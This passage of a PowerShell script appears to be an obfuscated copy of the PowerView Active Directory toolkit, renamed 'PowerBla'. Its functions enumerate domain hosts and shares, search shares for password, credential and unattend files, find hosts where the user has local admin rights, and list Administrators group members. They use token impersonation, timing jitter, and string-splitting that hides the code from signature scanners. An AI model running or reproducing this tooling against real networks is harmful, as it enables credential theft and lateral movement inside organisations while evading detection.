            &('Writ'+'e-'+'Verb'+'os'+'e') ('['+'Find-Domai'+'nSha'+'r'+'e] '+'D'+'el'+'ay: '+"$Delay, "+'Jitte'+'r: '+"$Jitter")
            $Counter = 0
            $RandNo = &('N'+'ew-O'+'bject') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('Start-S'+'l'+'ee'+'p') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('Writ'+'e'+'-V'+'erbose') "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &('Invok'+'e-C'+'o'+'mma'+'nd') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
            }
        }
        else {
            &('Wri'+'t'+'e-'+'Verbos'+'e') ('[Fi'+'nd-Dom'+'ai'+'nShar'+'e'+'] '+'U'+'sing '+'thread'+'ing'+' '+'wi'+'th '+'threads'+':'+' '+"$Threads")

            $ScriptParams = @{
                ('Chec'+'k'+'ShareAcce'+'s'+'s') = $CheckShareAccess
                ('To'+'ken'+'Han'+'dle') = $LogonToken
            }

            &('New'+'-Thread'+'ed'+'Fu'+'nction') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            &('In'+'voke-'+'Reve'+'rt'+'ToS'+'e'+'lf') -TokenHandle $LogonToken
        }
    }
}


function Find-InterestingDomainShareFile {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'S'+'h'+'ouldProc'+'ess'), '')]
    [OutputType(('Powe'+'rBla.Found'+'Fi'+'le'))]
    [CmdletBinding(DefaultParameterSetName = {'FileSpecif'+'icat'+'i'+'on'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('D'+'NSHos'+'tName'))]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('O'+'pe'+'rating'+'System'))]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(('S'+'er'+'vic'+'ePack'))]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(('SiteN'+'a'+'me'))]
        [String]
        $ComputerSiteName,

        [Parameter(ParameterSetName = "fILE`spEcI`FIcAT`I`On")]
        [ValidateNotNullOrEmpty()]
        [Alias(('S'+'e'+'arch'+'Terms'), ('Term'+'s'))]
        [String[]]
        $Include = @(('*p'+'asswor'+'d*'), ('*s'+'ensiti'+'ve*'), ('*adm'+'in*'), ('*lo'+'gi'+'n*'), ('*secr'+'e'+'t*'), ('un'+'atte'+'nd*.xml'), ('*.vmd'+'k'), ('*cre'+'ds*'), ('*cre'+'de'+'ntia'+'l*'), ('*.c'+'on'+'fig')),

        [ValidateNotNullOrEmpty()]
        [ValidatePattern('\\\\')]
        [Alias(('Shar'+'e'))]
        [String[]]
        $SharePath,

        [String[]]
        $ExcludedShares = @((('CW'+'fQ').rEPLacE('WfQ','$')), (('Adm'+'inIiv').REPLaCE('Iiv','$')), (('Pri'+'nt{0}')-f  [ChAr]36), (('IPC'+'5r'+'B').rePlACE('5rB',[STrINg][ChAR]36))),

        [Parameter(ParameterSetName = "F`iLESpE`cIF`iCaTI`oN")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastAccessTime,

        [Parameter(ParameterSetName = "F`ilESpec`I`FIc`ATiOn")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,

        [Parameter(ParameterSetName = "F`Ilesp`ECif`i`Cation")]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,

        [Parameter(ParameterSetName = "Of`FIced`ocS")]
        [Switch]
        $OfficeDocs,

        [Parameter(ParameterSetName = "FREsH`e`xeS")]
        [Switch]
        $FreshEXEs,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainCo'+'nt'+'roll'+'e'+'r'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('One'+'L'+'evel'), ('Sub'+'tree'))]
        [String]
        $SearchScope = ('Su'+'btree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ('Pr'+'operti'+'es') = ('dn'+'shostn'+'ame')
        }
        if ($PSBoundParameters[('ComputerDom'+'a'+'i'+'n')]) { $ComputerSearcherArguments[('D'+'o'+'main')] = $ComputerDomain }
        if ($PSBoundParameters[('C'+'omputerL'+'D'+'A'+'PFilt'+'er')]) { $ComputerSearcherArguments[('L'+'DAPF'+'ilter')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[('Co'+'mputer'+'S'+'e'+'arc'+'hBase')]) { $ComputerSearcherArguments[('Se'+'archB'+'ase')] = $ComputerSearchBase }
        if ($PSBoundParameters[('C'+'omputerO'+'pe'+'r'+'ati'+'ngSyst'+'em')]) { $ComputerSearcherArguments[('Ope'+'rat'+'ingSy'+'st'+'em')] = $OperatingSystem }
        if ($PSBoundParameters[('Compu'+'terS'+'e'+'rvice'+'Pack')]) { $ComputerSearcherArguments[('Servi'+'ce'+'P'+'ack')] = $ServicePack }
        if ($PSBoundParameters[('Comp'+'u'+'ter'+'Site'+'Name')]) { $ComputerSearcherArguments[('Sit'+'eNam'+'e')] = $SiteName }
        if ($PSBoundParameters[('S'+'erver')]) { $ComputerSearcherArguments[('Ser'+'ver')] = $Server }
        if ($PSBoundParameters[('Searc'+'h'+'Sc'+'ope')]) { $ComputerSearcherArguments[('Sea'+'r'+'chS'+'cope')] = $SearchScope }
        if ($PSBoundParameters[('Resul'+'tPag'+'e'+'Siz'+'e')]) { $ComputerSearcherArguments[('ResultP'+'age'+'S'+'i'+'ze')] = $ResultPageSize }
        if ($PSBoundParameters[('Server'+'T'+'ime'+'Limit')]) { $ComputerSearcherArguments[('S'+'erve'+'rTimeLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tomb'+'s'+'tone')]) { $ComputerSearcherArguments[('T'+'ombston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'ed'+'ential')]) { $ComputerSearcherArguments[('Creden'+'tia'+'l')] = $Credential }

        if ($PSBoundParameters[('Comput'+'er'+'Nam'+'e')]) {
            $TargetComputers = $ComputerName
        }
        else {
            &('W'+'ri'+'te-Verbos'+'e') ('[F'+'i'+'nd-Intere'+'sti'+'ngDomainSha'+'reFil'+'e] Que'+'r'+'ying comput'+'e'+'rs in'+' the doma'+'in')
            $TargetComputers = &('Get-Domai'+'nComp'+'ut'+'e'+'r') @ComputerSearcherArguments | &('Se'+'lect-Objec'+'t') -ExpandProperty dnshostname
        }
        &('Write'+'-Ver'+'bose') "[Find-InterestingDomainShareFile] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ('['+'F'+'ind'+'-Interesti'+'ngDomai'+'nSha'+'reFile] N'+'o hosts'+' found'+' to e'+'nume'+'ra'+'t'+'e')
        }

        $HostEnumBlock = {
            Param($ComputerName, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $TokenHandle)

            if ($TokenHandle) {
                $Null = &('Invok'+'e'+'-UserImpe'+'rs'+'onation') -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {

                $SearchShares = @()
                if ($TargetComputer.StartsWith((('LAU'+'L'+'AU')-rePlace ([CHAr]76+[CHAr]65+[CHAr]85),[CHAr]92))) {
                    $SearchShares += $TargetComputer
                }
                else {
                    $Up = &('Te'+'st'+'-Con'+'necti'+'on') -Count 1 -Quiet -ComputerName $TargetComputer
                    if ($Up) {
                        $Shares = &('Ge'+'t-Net'+'Share') -ComputerName $TargetComputer
                        ForEach ($Share in $Shares) {
                            $ShareName = $Share.Name
                            $Path = (('mN5'+'mN5').REPLAce(([chAR]109+[chAR]78+[chAR]53),[sTRinG][chAR]92))+$TargetComputer+'\'+$ShareName
                            if (($ShareName) -and ($ShareName.Trim() -ne '')) {
                                if ($ExcludedShares -NotContains $ShareName) {
                                    try {
                                        $Null = [IO.Directory]::GetFiles($Path)
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        &('Write-'+'Verbo'+'s'+'e') ('['+'!] '+'No'+' '+'acce'+'ss'+' '+'to'+' '+"$Path")
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ($Share in $SearchShares) {
                    &('Write-'+'Ve'+'r'+'bose') ('Searchi'+'n'+'g '+'s'+'hare: '+"$Share")
                    $SearchArgs = @{
                        ('Pa'+'th') = $Share
                        ('Inclu'+'de') = $Include
                    }
                    if ($OfficeDocs) {
                        $SearchArgs[('O'+'fficeD'+'ocs')] = $OfficeDocs
                    }
                    if ($FreshEXEs) {
                        $SearchArgs[('Fresh'+'EX'+'Es')] = $FreshEXEs
                    }
                    if ($LastAccessTime) {
                        $SearchArgs[('LastA'+'c'+'c'+'essTi'+'me')] = $LastAccessTime
                    }
                    if ($LastWriteTime) {
                        $SearchArgs[('La'+'stWriteT'+'ime')] = $LastWriteTime
                    }
                    if ($CreationTime) {
                        $SearchArgs[('C'+'r'+'eatio'+'nTime')] = $CreationTime
                    }
                    if ($CheckWriteAccess) {
                        $SearchArgs[('Che'+'ckWrit'+'eAc'+'cess')] = $CheckWriteAccess
                    }
                    &('Fin'+'d-I'+'nteres'+'tin'+'g'+'File') @SearchArgs
                }
            }

            if ($TokenHandle) {
                &('In'+'v'+'ok'+'e-R'+'ever'+'tToSelf')
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[('C'+'rede'+'ntial')]) {
            if ($PSBoundParameters[('Dela'+'y')] -or $PSBoundParameters[('Sto'+'pOnSucc'+'es'+'s')]) {
                $LogonToken = &('Invoke-UserImpe'+'rson'+'a'+'ti'+'on') -Credential $Credential
            }
            else {
                $LogonToken = &('Inv'+'ok'+'e-UserImpe'+'rs'+'onation') -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('De'+'lay')] -or $PSBoundParameters[('Sto'+'p'+'OnS'+'uccess')]) {

            &('W'+'rite-Verbo'+'se') "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            &('W'+'rite-Ve'+'rbos'+'e') ('[Find-'+'Inte'+'re'+'sti'+'ngDomainShareFi'+'le'+'] '+'Dela'+'y: '+"$Delay, "+'Ji'+'tter'+': '+"$Jitter")
            $Counter = 0
            $RandNo = &('N'+'e'+'w-Object') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('Start-S'+'l'+'eep') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('Writ'+'e-Verbos'+'e') "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &('I'+'nv'+'oke'+'-Comma'+'nd') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            &('Write-Ver'+'bos'+'e') ('[Fi'+'n'+'d-'+'Interestin'+'gDom'+'ainSh'+'are'+'F'+'il'+'e]'+' '+'U'+'si'+'ng '+'threadi'+'n'+'g'+' '+'w'+'ith '+'t'+'hrea'+'ds: '+"$Threads")

            $ScriptParams = @{
                ('Inclu'+'d'+'e') = $Include
                ('E'+'xcluded'+'Shar'+'es') = $ExcludedShares
                ('Of'+'fic'+'eDocs') = $OfficeDocs
                ('E'+'x'+'cludeHid'+'de'+'n') = $ExcludeHidden
                ('Fresh'+'EXE'+'s') = $FreshEXEs
                ('C'+'heckWri'+'teA'+'ccess') = $CheckWriteAccess
                ('T'+'okenH'+'andl'+'e') = $LogonToken
            }

            &('N'+'ew'+'-Thr'+'eadedFunction') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            &('In'+'vo'+'ke-'+'RevertToS'+'e'+'lf') -TokenHandle $LogonToken
        }
    }
}


function Find-LocalAdminAccess {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SS'+'hould'+'Process'), '')]
    [OutputType([String])]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('DNSHost'+'Na'+'me'))]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('Op'+'erati'+'ngSys'+'t'+'em'))]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(('Ser'+'viceP'+'ac'+'k'))]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(('S'+'iteNam'+'e'))]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainC'+'on'+'tro'+'l'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('Ba'+'se'), ('OneLev'+'el'), ('Subtr'+'ee'))]
        [String]
        $SearchScope = ('S'+'ubtr'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ('Prope'+'rti'+'es') = ('dnsho'+'st'+'na'+'me')
        }
        if ($PSBoundParameters[('Compu'+'t'+'erDo'+'m'+'ain')]) { $ComputerSearcherArguments[('D'+'omai'+'n')] = $ComputerDomain }
        if ($PSBoundParameters[('Compute'+'rLDAPF'+'i'+'lter')]) { $ComputerSearcherArguments[('LDAP'+'Filte'+'r')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[('C'+'o'+'mputerS'+'e'+'archBas'+'e')]) { $ComputerSearcherArguments[('Sea'+'rchB'+'as'+'e')] = $ComputerSearchBase }
        if ($PSBoundParameters[('Uncons'+'t'+'ra'+'ined')]) { $ComputerSearcherArguments[('Un'+'const'+'raine'+'d')] = $Unconstrained }
        if ($PSBoundParameters[('Com'+'pu'+'te'+'rOpe'+'ratingSy'+'stem')]) { $ComputerSearcherArguments[('Op'+'era'+'ti'+'ngSystem')] = $OperatingSystem }
        if ($PSBoundParameters[('C'+'om'+'pu'+'te'+'rSer'+'vice'+'Pack')]) { $ComputerSearcherArguments[('S'+'e'+'rvice'+'Pack')] = $ServicePack }
        if ($PSBoundParameters[('C'+'omp'+'ute'+'rSiteNa'+'me')]) { $ComputerSearcherArguments[('S'+'iteNa'+'me')] = $SiteName }
        if ($PSBoundParameters[('S'+'erver')]) { $ComputerSearcherArguments[('Se'+'rve'+'r')] = $Server }
        if ($PSBoundParameters[('Sea'+'rchScop'+'e')]) { $ComputerSearcherArguments[('Searc'+'hS'+'cop'+'e')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sul'+'tPage'+'Siz'+'e')]) { $ComputerSearcherArguments[('Res'+'ul'+'tPa'+'geSize')] = $ResultPageSize }
        if ($PSBoundParameters[('Serve'+'rTimeLi'+'m'+'it')]) { $ComputerSearcherArguments[('Ser'+'verTim'+'eLimit')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tomb'+'ston'+'e')]) { $ComputerSearcherArguments[('Tom'+'bst'+'one')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'edent'+'ial')]) { $ComputerSearcherArguments[('Cred'+'e'+'ntia'+'l')] = $Credential }

        if ($PSBoundParameters[('C'+'omputerNam'+'e')]) {
            $TargetComputers = $ComputerName
        }
        else {
            &('Wri'+'te-Ve'+'r'+'bose') ('[Find-L'+'ocalAdm'+'inAcc'+'ess] Queryi'+'ng co'+'mp'+'ut'+'ers in the d'+'oma'+'in')
            $TargetComputers = &('Get'+'-DomainCo'+'mpu'+'ter') @ComputerSearcherArguments | &('Sel'+'ec'+'t-Ob'+'ject') -ExpandProperty dnshostname
        }
        &('Wri'+'t'+'e-Ve'+'rbose') "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ('[Find-Local'+'Admi'+'nAccess'+'] No h'+'os'+'ts found to'+' '+'enum'+'e'+'rate')
        }

        $HostEnumBlock = {
            Param($ComputerName, $TokenHandle)

            if ($TokenHandle) {
                $Null = &('Invoke-Us'+'er'+'Imperso'+'n'+'a'+'tion') -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = &('Test-'+'C'+'on'+'nection') -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Access = &('Test-'+'Ad'+'m'+'inA'+'ccess') -ComputerName $TargetComputer
                    if ($Access.IsAdmin) {
                        $TargetComputer
                    }
                }
            }

            if ($TokenHandle) {
                &('I'+'nv'+'ok'+'e-RevertT'+'oSelf')
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[('Cr'+'eden'+'t'+'ial')]) {
            if ($PSBoundParameters[('Dela'+'y')] -or $PSBoundParameters[('S'+'topOn'+'Success')]) {
                $LogonToken = &('I'+'n'+'voke-Use'+'r'+'Im'+'personation') -Credential $Credential
            }
            else {
                $LogonToken = &('In'+'voke-'+'Us'+'erI'+'m'+'person'+'at'+'ion') -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('D'+'elay')] -or $PSBoundParameters[('S'+'topOnS'+'u'+'cces'+'s')]) {

            &('Write'+'-Ve'+'rbose') "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            &('Wri'+'te'+'-V'+'e'+'rbose') ('[Find-Local'+'Adm'+'i'+'nA'+'ccess'+'] '+'De'+'lay'+': '+"$Delay, "+'Ji'+'t'+'ter: '+"$Jitter")
            $Counter = 0
            $RandNo = &('New-Ob'+'j'+'e'+'ct') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('Sta'+'rt-Slee'+'p') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('Write-Verb'+'os'+'e') "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &('Invok'+'e-C'+'omman'+'d') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            &('Write'+'-'+'Verb'+'o'+'se') ('[Fin'+'d-Loca'+'l'+'Admi'+'n'+'Acces'+'s] '+'U'+'sing '+'thr'+'ead'+'ing '+'wit'+'h '+'thre'+'ads:'+' '+"$Threads")

            $ScriptParams = @{
                ('Token'+'Handl'+'e') = $LogonToken
            }

            &('New-Threaded'+'Fun'+'ct'+'ion') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function Find-DomainLocalGroupMember {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PS'+'Sho'+'u'+'ldPro'+'cess'), '')]
    [OutputType(('P'+'o'+'werBla.L'+'oca'+'lGroupMember.API'))]
    [OutputType(('P'+'o'+'werBla.Loc'+'alGrou'+'pMe'+'mber.W'+'i'+'n'+'N'+'T'))]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('D'+'NSHo'+'stName'))]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('O'+'per'+'atingSy'+'stem'))]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty()]
        [Alias(('Se'+'rvic'+'ePa'+'ck'))]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias(('Si'+'teNam'+'e'))]
        [String]
        $ComputerSiteName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName = ('Ad'+'minis'+'tr'+'ators'),

        [ValidateSet(('A'+'PI'), ('Wi'+'nNT'))]
        [Alias(('C'+'ollection'+'Me'+'tho'+'d'))]
        [String]
        $Method = ('A'+'PI'),

        [ValidateNotNullOrEmpty()]
        [Alias(('Domai'+'nCo'+'ntroll'+'e'+'r'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('O'+'neLevel'), ('Su'+'bt'+'ree'))]
        [String]
        $SearchScope = ('Subt'+'r'+'ee'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Int]
        [ValidateRange(1, 100)]
        $Threads = 20
    )

    BEGIN {
        $ComputerSearcherArguments = @{
            ('Prope'+'rti'+'es') = ('dn'+'shostna'+'m'+'e')
        }
        if ($PSBoundParameters[('Co'+'m'+'put'+'erDomai'+'n')]) { $ComputerSearcherArguments[('D'+'omain')] = $ComputerDomain }
        if ($PSBoundParameters[('Comput'+'e'+'rLDAP'+'F'+'ilter')]) { $ComputerSearcherArguments[('LDA'+'PFil'+'ter')] = $ComputerLDAPFilter }
        if ($PSBoundParameters[('Com'+'puterSea'+'r'+'ch'+'Base')]) { $ComputerSearcherArguments[('Sea'+'r'+'chBa'+'se')] = $ComputerSearchBase }
        if ($PSBoundParameters[('Un'+'const'+'rained')]) { $ComputerSearcherArguments[('Unc'+'on'+'str'+'a'+'ined')] = $Unconstrained }
        if ($PSBoundParameters[('ComputerO'+'pe'+'rati'+'n'+'g'+'Syste'+'m')]) { $ComputerSearcherArguments[('Operati'+'ngS'+'y'+'s'+'tem')] = $OperatingSystem }
        if ($PSBoundParameters[('Co'+'mp'+'ut'+'erSer'+'viceP'+'ac'+'k')]) { $ComputerSearcherArguments[('Servi'+'ce'+'Pack')] = $ServicePack }
        if ($PSBoundParameters[('Compute'+'r'+'Si'+'teName')]) { $ComputerSearcherArguments[('Si'+'te'+'Name')] = $SiteName }
        if ($PSBoundParameters[('Serve'+'r')]) { $ComputerSearcherArguments[('Serve'+'r')] = $Server }
        if ($PSBoundParameters[('Sear'+'chSco'+'pe')]) { $ComputerSearcherArguments[('S'+'ea'+'rchScope')] = $SearchScope }
        if ($PSBoundParameters[('Res'+'ultPa'+'g'+'eS'+'ize')]) { $ComputerSearcherArguments[('Res'+'ultPage'+'Size')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erverT'+'i'+'meL'+'imit')]) { $ComputerSearcherArguments[('Serve'+'rT'+'i'+'meLim'+'it')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombst'+'o'+'ne')]) { $ComputerSearcherArguments[('T'+'o'+'mbstone')] = $Tombstone }
        if ($PSBoundParameters[('Cr'+'eden'+'tial')]) { $ComputerSearcherArguments[('Cr'+'edenti'+'al')] = $Credential }

        if ($PSBoundParameters[('Comp'+'uterNa'+'me')]) {
            $TargetComputers = $ComputerName
        }
        else {
            &('Write'+'-Verbo'+'se') ('['+'Fi'+'nd-DomainLo'+'c'+'alGrou'+'pMem'+'be'+'r] Querying co'+'mputers '+'i'+'n the do'+'mai'+'n')
            $TargetComputers = &('Ge'+'t'+'-Dom'+'ain'+'Comp'+'uter') @ComputerSearcherArguments | &('S'+'el'+'ect-Objec'+'t') -ExpandProperty dnshostname
        }
        &('Wri'+'te-'+'Verbose') "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.Length -eq 0) {
            throw ('[Find-D'+'omainLocalGroup'+'Mem'+'ber] No'+' ho'+'sts'+' found to'+' enu'+'mer'+'ate')
        }

        $HostEnumBlock = {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            if ($GroupName -eq ('A'+'d'+'ministr'+'ators')) {
                $AdminSecurityIdentifier = &('New-Ob'+'je'+'ct') System.Security.Principal.SecurityIdentifier([System.Security.Principal.WellKnownSidType]::BuiltinAdministratorsSid,$null)
                $GroupName = ($AdminSecurityIdentifier.Translate([System.Security.Principal.NTAccount]).Value -split (('2Mr'+'2Mr')  -cREPLaCE  ([chaR]50+[chaR]77+[chaR]114),[chaR]92))[-1]
            }

            if ($TokenHandle) {
                $Null = &('Invoke-U'+'se'+'r'+'Imp'+'ersonation') -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = &('Test'+'-C'+'onnection') -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $NetLocalGroupMemberArguments = @{
                        ('C'+'omput'+'erName') = $TargetComputer
                        ('M'+'etho'+'d') = $Method
                        ('Grou'+'pNa'+'me') = $GroupName
                    }
                    &('Get-'+'NetL'+'ocalGro'+'u'+'pMem'+'b'+'er') @NetLocalGroupMemberArguments
                }
            }

            if ($TokenHandle) {
                &('Invoke-'+'R'+'eve'+'rtTo'+'Self')
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters[('C'+'reden'+'tial')]) {
            if ($PSBoundParameters[('Dela'+'y')] -or $PSBoundParameters[('S'+'topOnSu'+'cce'+'ss')]) {
                $LogonToken = &('Invoke-Use'+'r'+'Imp'+'er'+'so'+'nation') -Credential $Credential
            }
            else {
                $LogonToken = &('Inv'+'ok'+'e-User'+'Impers'+'onatio'+'n') -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        if ($PSBoundParameters[('D'+'elay')] -or $PSBoundParameters[('Sto'+'pO'+'nS'+'uccess')]) {

            &('Write-'+'V'+'er'+'bose') "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            &('Write'+'-V'+'erbos'+'e') ('[Fi'+'nd-Dom'+'ai'+'nLoca'+'lGroupM'+'em'+'ber] '+'Delay'+': '+"$Delay, "+'Jit'+'ter:'+' '+"$Jitter")
            $Counter = 0
            $RandNo = &('New-Ob'+'j'+'ect') System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                &('Start'+'-Sl'+'ee'+'p') -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                &('W'+'rite-'+'Verb'+'o'+'se') "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                &('I'+'nvoke-'+'Co'+'mm'+'and') -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            &('Write-Verb'+'o'+'se') ('[Fi'+'nd-'+'D'+'o'+'ma'+'inLo'+'calGroup'+'Mem'+'ber] '+'Usin'+'g '+'th'+'reading'+' '+'wi'+'th '+'thr'+'ead'+'s: '+"$Threads")

            $ScriptParams = @{
                ('Gr'+'oup'+'N'+'ame') = $GroupName
                ('Meth'+'od') = $Method
                ('T'+'okenHa'+'ndle') = $LogonToken
            }

            &('New'+'-Th'+'reade'+'dFu'+'nction') -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            &('I'+'nvok'+'e-R'+'evertToSe'+'lf') -TokenHandle $LogonToken
        }
    }
}



function Get-DomainTrust {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'ould'+'Pr'+'ocess'), '')]
    [OutputType(('Pow'+'e'+'rBla.DomainT'+'rust'+'.NET'))]
    [OutputType(('Power'+'Bl'+'a.Domain'+'Trust.LDA'+'P'))]
    [OutputType(('Powe'+'rBla.'+'Domain'+'Tr'+'ust.A'+'P'+'I'))]
    [CmdletBinding(DefaultParameterSetName = {'LD'+'AP'})]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('N'+'ame'))]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Parameter(ParameterSetName = "A`pi")]
        [Switch]
        $API,

        [Parameter(ParameterSetName = "N`Et")]
        [Switch]
        $NET,

        [Parameter(ParameterSetName = "LD`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'i'+'lter'))]
        [String]
        $LDAPFilter,
